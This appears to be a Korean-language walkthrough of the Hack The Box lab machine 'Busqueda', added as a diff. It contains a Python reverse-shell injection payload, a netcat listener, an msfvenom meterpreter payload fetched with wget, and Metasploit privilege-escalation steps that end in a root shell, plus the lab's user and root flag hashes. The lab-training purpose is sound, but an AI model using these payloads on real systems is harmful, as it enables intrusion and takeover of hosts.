@@ -1,0 +1,102 @@
+Machine: Busqueda
+TARGET: 10.129.178.117
+
+nmap -sV -sC -oA nmap/Busqueda $ip  
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://searcher.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+/etc/hosts에 아래줄 추가
+10.129.178.117  searcher.htb
+
+http://searcher.htb/ 웹페이지 접속
+
+searcher라는 검색 웹사이트 검색엔진을 선택하고 검색할 내용을 입력하면 해당 검색사이트에 주소를 보여준다.
+
+What do you want to search for: asdas'+'asd 
+위 테스트 입력을 넣으면
+https://www.bing.com/search?q=asdasasd 
+위와같이 합쳐져서 출력된다 이건 공격자의 코드가 실행될 수도 있다
+
+payload
+', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker ip',attackerpot));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
+
+nc -nlvp 9999
+공격자 포트를 열고 위 페이로드를 웹사이트에 요청하면 리버스셸이 연결된다
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl + z
+stty raw -echo;fg
+안정된 셸로 전환
+
+cat user.txt 
+> 54a7ce58f5cb31e7226f192a4d687df1
+
+
+sudo -l
+find / -perm -4000 -type f 2> /dev/null
+별다른 점 못찾음
+
+metasploit
+post/multi/recon/local_exploit_suggester 사용해서 취약점 스캔
+
+
+
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f elf > meterpreter.elf
+payload 타겟 서버로 전송
+python3 -m http.server 8888
+wget http://10.10.14.156:8888/meterpreter.elf
+chmod +x meterpreter.elf
+
+msfconsole 
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter_reverse_tcp
+set LHOST 10.10.14.156
+run
+
+use post/multi/recon/local_exploit_suggester 
+set session 1
+run 
+
+ #   Name                                                                Potentially Vulnerable?  Check Result
+ -   ----                                                                -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0                                                                                                                                 
+ 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/cve_2023_0386_overlayfs_priv_esc                Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0                                                                                                                                 
+ 4   exploit/linux/local/glibc_tunables_priv_esc                         Yes                      The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable                                                                                   
+ 5   exploit/linux/local/netfilter_nft_set_elem_init_privesc             Yes                      The target appears to be vulnerable.
+ 6   exploit/linux/local/runc_cwd_priv_esc                               Yes                      The target appears to be vulnerable. Version of runc detected appears to be vulnerable: 1.1.4-0ubuntu1~22.04.1.                                                                                         
+ 7   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
+ 8   exploit/linux/local/ubuntu_needrestart_lpe                          Yes                      The target appears to be vulnerable. Vulnerable needrestart version 3.5.pre.5ubuntu2.1 detected on Ubuntu 22.04                                                   
+
+
+
+첫번째 시도 exploit/linux/local/cve_2022_0847_dirtypipe 실패 
+
+
+두번째 시도 exploit/linux/local/cve_2023_0386_overlayfs_priv_esc   실패
+
+세번째 시도 exploit/linux/local/glibc_tunables_priv_esc
+set SESSION 1
+run
+
+root 셸 획득
+
+meterpreter > getuid                                                                                                                                 
+Server username: root                                                                                                                                
+meterpreter > cat /root/root.txt                                                                                                                     
+
+
+> a5e11ed334c867dcbc276a41796289f6
+
+
+
+
